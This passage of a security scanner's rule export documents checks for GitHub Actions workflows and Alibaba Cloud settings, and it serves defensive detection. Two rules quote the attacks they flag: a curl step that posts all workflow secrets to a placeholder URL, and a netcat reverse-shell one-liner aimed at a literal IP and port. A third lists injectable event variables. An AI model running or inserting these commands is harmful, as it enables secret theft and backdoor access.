      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="actions_allow_unsecure_commands-environment-variable-is-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-actions-allow-unsecure-commands-environment-variable-is-set-to-true"></div>ACTIONS_ALLOW_UNSECURE_COMMANDS environment variable is set to true</div><a aria-label="Skip link to ACTIONS_ALLOW_UNSECURE_COMMANDS environment variable is set to true" class="heading-anchor-icon fa fa-anchor" href="#actions_allow_unsecure_commands-environment-variable-is-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GitHub Actions has an environment variable flag called <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ACTIONS_ALLOW_UNSECURE_COMMANDS</code> that allows GHA workflows to run deprecated commands <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">set-env</code> and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">add-path</code>. These are vulnerable commands that should not be used as they expose accounts to potential credential theft or code injection.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1>
<p>Remove <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'</code></p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">...
         env:
-          ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'
...
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-actions_allow_unsecure_commands-isnt-true-on-environment-variables' target='_blank'> https://docs.bridgecrew.io/docs/ensure-actions_allow_unsecure_commands-isnt-true-on-environment-variables</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-actions_allow_unsecure_commands-isnt-true-on-environment-variables' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_2</key>
    <name>Ensure run commands are not vulnerable to shell injection</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="run-commands-are-vulnerable-to-shell-injection"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-run-commands-are-vulnerable-to-shell-injection"></div>Run commands are vulnerable to shell injection</div><a aria-label="Skip link to Run commands are vulnerable to shell injection" class="heading-anchor-icon fa fa-anchor" href="#run-commands-are-vulnerable-to-shell-injection"></a></h1>
<p>Block potentially risky references to variables that are controlled by third parties. You should avoid any API calls that include processing these as input. <a href="https://securitylab.github.com/research/github-actions-untrusted-input/" target="_self">Source</a></p>
<p>Potentially risky variables include:</p>
<ul>
<li>github.event.issue.title</li>
<li>github.event.issue.body</li>
<li>github.event.pull_request.title</li>
<li>github.event.pull_request.body</li>
<li>github.event.comment.body</li>
<li>github.event.review.body</li>
<li>github.event.review_comment.body</li>
<li>github.event.pages.*.page_name</li>
<li>github.event.commits.*.message</li>
<li>github.event.head_commit.message</li>
<li>github.event.head_commit.author.email</li>
<li>github.event.head_commit.author.name</li>
<li>github.event.commits.*.author.email</li>
<li>github.event.commits.*.author.name</li>
<li>github.event.pull_request.head.ref</li>
<li>github.event.pull_request.head.label</li>
<li>github.event.pull_request.head.repo.default_branch</li>
<li>github.head_ref</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">-          title="${{ github.event.issue.title }}"
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-run-commands-are-not-vulnerable-to-shell-injection' target='_blank'> https://docs.bridgecrew.io/docs/ensure-run-commands-are-not-vulnerable-to-shell-injection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-run-commands-are-not-vulnerable-to-shell-injection' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_3</key>
    <name>Suspicious use of curl with secrets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="curl-is-being-with-secrets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-curl-is-being-with-secrets"></div>Curl is being with secrets</div><a aria-label="Skip link to Curl is being with secrets" class="heading-anchor-icon fa fa-anchor" href="#curl-is-being-with-secrets"></a></h1>
<p>If a secret is able to be obtained in a workflow and a bad actor can modify the GitHub Action, they can send the secret to a website they own via curl.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Block code and remove code that attempts to exfiltrate secrets.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">       run:  |
-         echo "${{ toJSON(secrets) }}" &gt; .secrets
-         curl -X POST -s --data "@.secrets" &lt;BADURL &gt; /dev/null
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-secrets' target='_blank'> https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-secrets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-secrets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_4</key>
    <name>Suspicious use of netcat with IP address</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="netcat-is-being-used-with-ip-address"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-netcat-is-being-used-with-ip-address"></div>Netcat is being used with IP address</div><a aria-label="Skip link to Netcat is being used with IP address" class="heading-anchor-icon fa fa-anchor" href="#netcat-is-being-used-with-ip-address"></a></h1>
<p>Netcat in combination with an IP address can be used to establish a connection to an external computer or server. This can be used to open up backdoor access or exfiltrate data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Block code and remove code that attempts to make a connection over a network.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">-         rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|netcat 34.159.16.75 32032 &gt;/tmp/f
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/suspicious-use-of-netcat-with-ip-address' target='_blank'> https://docs.bridgecrew.io/docs/suspicious-use-of-netcat-with-ip-address</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/suspicious-use-of-netcat-with-ip-address' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_19</key>
    <name>Ensure Alibaba Cloud RAM password policy requires at least one uppercase letter</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-have-an-uppercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-have-an-uppercase-character"></div>Alibaba Cloud RAM password policy does not have an uppercase character</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not have an uppercase character" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-have-an-uppercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts that do not have an uppercase character in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Required Elements in Password' field, select 'Upper-Case Letter'</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = false
  require_uppercase_characters = true
  require_numbers              = false
  require_symbols              = true
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-uppercase-letter' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-uppercase-letter</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-uppercase-letter' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_13</key>
    <name>Ensure Alibaba Cloud RAM password policy requires minimum length of 14 or greater</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-have-a-minimum-of-14-characters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-have-a-minimum-of-14-characters"></div>Alibaba Cloud RAM password policy does not have a minimum of 14 characters</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not have a minimum of 14 characters" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-have-a-minimum-of-14-characters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts that do not have a minimum of 14 characters in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Password Length' field, enter 14 as the minimum number of characters for password complexity.</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = false
  require_uppercase_characters = true
  require_numbers              = false
  require_symbols              = true
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-minimum-length-of-14-or-greater' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-minimum-length-of-14-or-greater</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-minimum-length-of-14-or-greater' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_11</key>
    <name>Mailchimp Access Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mailchimp-access-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-mailchimp-access-key"></div>Mailchimp Access Key</div><a aria-label="Skip link to Mailchimp Access Key" class="heading-anchor-icon fa fa-anchor" href="#mailchimp-access-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check detects a Mailchimp access key referenced in your source code. The key enables an authenticated user to perform operational and management activities exposed by Mailchimp's developer API service. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke Secret.<br/>
An activated API Key can be deactivated from the Mailchimp dashboard under the Extras/API Key tab.</p>
<ol>
<li>Go to <a href="https://us1.admin.mailchimp.com/account/api" target="_self">https://us1.admin.mailchimp.com/account/api</a>/ to open the API Keys section of your account.</li>
<li>Find the API key you want to disable, and toggle the slider in the Status column for that API key.</li>
<li>Find the API key you want to disable and click Disable.</li>
<li>In the pop-up modal, click Disable.</li>
</ol>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check the API calls logs in the Mailchimp dashboard to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_11' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_25</key>
    <name>Ensure Alibaba Cloud RDS Instance SQL Collector Retention Period should be greater than 180</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-rds-instance-sql-collector-retention-period-is-less-than-180"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-rds-instance-sql-collector-retention-period-is-less-than-180"></div>Alibaba Cloud RDS Instance SQL Collector Retention Period is less than 180</div><a aria-label="Skip link to Alibaba Cloud RDS Instance SQL Collector Retention Period is less than 180" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-rds-instance-sql-collector-retention-period-is-less-than-180"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_db_instance" "pass" {
  engine                     = "MySQL"
  engine_version             = "5.6"
  instance_type              = "rds.mysql.t1.small"
  instance_storage           = "10"
  sql_collector_status       = "Enabled"
  sql_collector_config_value = 180
  parameters = [{
    name  = "innodb_large_prefix"
    value = "ON"
    }, {
    name  = "connect_timeout"
    value = "50"
    }, {
    name  = "log_connections"
    value = "ON"
  }]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-sql-collector-retention-period-should-be-greater-than-180' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-sql-collector-retention-period-should-be-greater-than-180</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-sql-collector-retention-period-should-be-greater-than-180' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_16</key>
    <name>Ensure Alibaba Cloud RAM password policy expires passwords within 90 days or less</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-expire-passwords-within-90-days-or-less"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-expire-passwords-within-90-days-or-less"></div>Alibaba Cloud RAM password policy does not expire passwords within 90 days or less</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not expire passwords within 90 days or less" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-expire-passwords-within-90-days-or-less"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts for which do not have password expiration set to 90 days or less. As a best practice, change your password every 90 days or sooner to ensure secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Password Validity Period' field, enter 90 or less based on your requirement.</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">TBD
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-expires-passwords-within-90-days-or-less' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-expires-passwords-within-90-days-or-less</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-expires-passwords-within-90-days-or-less' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_22</key>
    <name>Ensure Alibaba Cloud Transparent Data Encryption is Enabled on instance</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-transparent-data-encryption-is-disabled-on-instance"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-transparent-data-encryption-is-disabled-on-instance"></div>Alibaba Cloud Transparent Data Encryption is disabled on instance</div><a aria-label="Skip link to Alibaba Cloud Transparent Data Encryption is disabled on instance" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-transparent-data-encryption-is-disabled-on-instance"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_db_instance" "pass" {
  engine              = "MySQL"
  engine_version      = "5.6"
  instance_type   = "rds.mysql.t1.small"
  instance_storage = "10"
  tde_status          = "Enabled"
  parameters = [{
    name  = "innodb_large_prefix"
    value = "ON"
    }, {
    name  = "connect_timeout"
    value = "50"
  }]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-transparent-data-encryption-is-enabled-on-instance' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-transparent-data-encryption-is-enabled-on-instance</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-transparent-data-encryption-is-enabled-on-instance' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_14</key>
    <name>Ensure Alibaba Cloud RAM password policy requires at least one number</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-have-a-number"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-have-a-number"></div>Alibaba Cloud RAM password policy does not have a number</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not have a number" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-have-a-number"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts that do not have a number in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Required Elements in Password' field, select 'Numbers'</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = false
  require_uppercase_characters = true
  require_numbers              = true
  require_symbols              = true
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-number' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-number</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
